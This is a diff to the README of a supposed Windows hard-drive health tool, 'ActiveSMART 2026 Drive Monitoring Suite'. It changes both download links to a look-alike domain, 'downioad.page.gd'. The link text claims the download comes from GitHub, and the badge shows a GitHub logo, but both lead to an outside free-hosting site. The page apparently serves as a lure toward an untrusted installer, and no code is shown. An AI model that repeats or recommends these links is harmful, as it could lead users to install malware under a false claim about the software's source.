@@ -2,7 +2,7 @@
 
 ActiveSMART 2026 Drive Monitoring Suite is a comprehensive hard drive health analysis and system monitoring utility designed exclusively for Windows desktops. This tool provides real-time S.M.A.R.T. data interpretation, temperature tracking, and predictive failure alerts to help users maintain optimal storage performance. Whether you are a system administrator managing multiple workstations or a home user who wants peace of mind about your data safety, this suite delivers professional-grade diagnostics in an accessible interface.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ---
 
@@ -81,7 +81,7 @@ For additional assistance, please open an issue on this repository and include y
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
